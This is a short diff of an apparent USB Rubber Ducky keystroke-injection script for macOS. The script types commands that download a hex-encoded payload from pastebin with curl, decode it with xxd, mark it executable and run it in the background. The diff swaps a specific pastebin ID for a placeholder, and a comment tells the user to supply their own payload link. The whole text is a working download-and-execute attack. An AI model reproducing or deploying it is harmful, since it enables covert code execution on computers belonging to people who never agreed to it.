@@ -12,7 +12,7 @@ DELAY 3000
 COMMAND n
 DELAY 2000
 REM Change payload link below to your payload
-STRING curl http://pastebin.com/raw.php?i=yVaTh10A >/tmp/pay
+STRING curl http://pastebin.com/raw.php?i=###### >/tmp/pay
 STRING xxd -r -p /tmp/pay /tmp/p1
 STRING chmod +x /tmp/p1
 STRING /tmp/p1 &
